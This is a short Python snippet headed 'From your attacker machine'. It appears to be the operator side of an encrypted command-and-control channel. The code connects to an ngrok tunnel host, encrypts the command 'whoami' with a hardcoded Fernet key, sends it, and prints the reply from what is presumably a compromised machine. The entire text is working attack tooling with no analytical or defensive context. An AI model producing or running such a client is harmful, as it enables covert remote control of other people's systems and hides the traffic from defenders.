# From your attacker machine
import socket
from cryptography.fernet import Fernet
cipher = Fernet(b'9NwSfijmfS35Y9LLkjAh8o8XG5ehc5XZiL4t-IEfPMQ=')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("overbusy-milissa-perspiratory.ngrok-free.dev", 443))
s.send(cipher.encrypt(b"whoami"))
print(s.recv(4096))